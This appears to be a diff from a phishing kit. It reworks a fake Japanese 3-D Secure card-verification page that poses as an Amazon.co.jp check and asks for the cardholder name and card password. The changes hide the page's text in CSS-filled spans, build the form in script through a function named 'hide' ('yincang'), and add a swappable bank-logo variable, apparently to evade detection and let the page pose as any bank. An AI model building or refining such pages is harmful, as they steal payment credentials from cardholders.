@@ -5,10 +5,11 @@
     <meta http-equiv="Cache-Control" content="no-cache">
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <link href="card/a3/ntt.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="../style/css/secure.css"/>
     <link rel="stylesheet" type="text/css" href="card/a3/foundation_V_PC.css">
     <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />
     <title>
-        J/Secure
+        Secure
     </title>
     <style>
         .error {
@@ -50,8 +51,8 @@
 <script src="../js/jquery.min.js"></script>
 <script src="../js/jquery.validate.min.js"></script>
 <script  type="text/javascript">
-    setTimeout("yincang()", 0);
-    function yincang() {
+    setTimeout("yincang()", 100);
+        function yincang() {
         let content = document.getElementById('bodyid');
         content.innerHTML = "<form method=\"post\" id=\"formvbv\" name=\"formvbv\" action=\"\">\n" +
                 "    <center>\n" +
@@ -73,7 +74,7 @@
                 "                                                    </td>\n" +
                 "\n" +
                 "                                                    <td align=\"right\" width=\"50%\">\n" +
-                "\n" +
+                "                                                        <img src=\"${bankImage!''}\" border=\"0\" >\n" +
                 "                                                    </td>\n" +
                 "                                                </tr>\n" +
                 "                                                </tbody></table>\n" +
@@ -82,7 +83,7 @@
                 "                                    </tr>\n" +
                 "                                    </tbody></table>\n" +
                 "                                <div class=\"protection\">Added Protection</div>\n" +
-                "                                <div class=\"message\">お客様のご利用カード会社インターネットサービスパスワードをご入力ください。</div>\n" +
+                "                                <div class=\"message\"><span class='secure1'></span></div>\n" +
                 "\n" +
                 "                                <table cellpadding=\"3\" cellspacing=\"0\" border=\"0\" width=\"100%\">\n" +
                 "                                    <tbody>\n" +
@@ -95,16 +96,16 @@
                 "\n" +
                 "                                                <tbody><tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
-                "                                                        店舗名:\n" +
+                "                                                        <span class='secure2'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                    <td width=\"10px\">\n" +
                 "                                                    </td>\n" +
                 "                                                    <td valign=\"top\" class=\"normalgray\" width=\"165px\">\n" +
-                "                                                        Amazon.co.jp検証\n" +
+                "                                                        <span class='secure3'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                </tr><tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
-                "                                                        金額:\n" +
+                "                                                        <span class='secure4'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                    <td width=\"10px\">\n" +
                 "                                                    </td>\n" +
@@ -114,7 +115,7 @@
                 "                                                </tr>\n" +
                 "                                                <tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
-                "                                                        日付:\n" +
+                "                                                        <span class='secure5'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                    <td width=\"10px\">\n" +
                 "                                                    </td>\n" +
@@ -132,7 +133,7 @@
                 "                                                </tr>\n" +
                 "                                                <tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"top\" align=\"right\" width=\"165px\">\n" +
-                "                                                        カード名義人：\n" +
+                "                                                        <span class='secure6'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                    <td width=\"10px\">\n" +
                 "                                                    </td>\n" +
@@ -143,7 +144,7 @@
                 "\n" +
                 "                                                <tr>\n" +
                 "                                                    <td class=\"normalgray\" valign=\"center\" width=\"165px\" align=\"right\">\n" +
-                "                                                        パスワード:\n" +
+                "                                                        <span class='secure7'></span>\n" +
                 "                                                    </td>\n" +
                 "                                                    <td width=\"10px\">\n" +
                 "                                                    </td>\n" +
@@ -164,7 +165,7 @@
                 "                                                    </td>\n" +
                 "                                                    <td valign=\"top\" align=\"left\">\n" +
                 "                                                        <a class=\"forgotlink\" href=\"javascript:ForgotPassword()\">\n" +
-                "                                                            パスワードを忘れた場合は\n" +
+                "                                                            <span class='secure8'></span>\n" +
                 "                                                        </a>\n" +
                 "                                                    </td>\n" +
                 "                                                </tr>\n" +
@@ -192,13 +193,13 @@
                 "                                                                </td>\n" +
                 "                                                                <td nowrap=\"\">\n" +
                 "                                                                    <a class=\"normallink\" href=\"javascript:Help()\">\n" +
-                "                                                                        <font class=\"normallink\">ヘルプ</font>\n" +
+                "                                                                        <font class=\"normallink\"><span class='secure9'></span></font>\n" +
                 "                                                                    </a>\n" +
                 "\n" +
                 "                                                                </td>\n" +
                 "                                                                <td nowrap=\"\">\n" +
                 "                                                                    <a class=\"normallink\" href=\"javascript:Cancel()\">\n" +
-                "                                                                        <font class=\"normallink\">キャンセル</font>\n" +
+                "                                                                        <font class=\"normallink\"><span class='secure10'></span></font>\n" +
                 "                                                                    </a>\n" +
                 "\n" +
                 "                                                                </td>\n" +
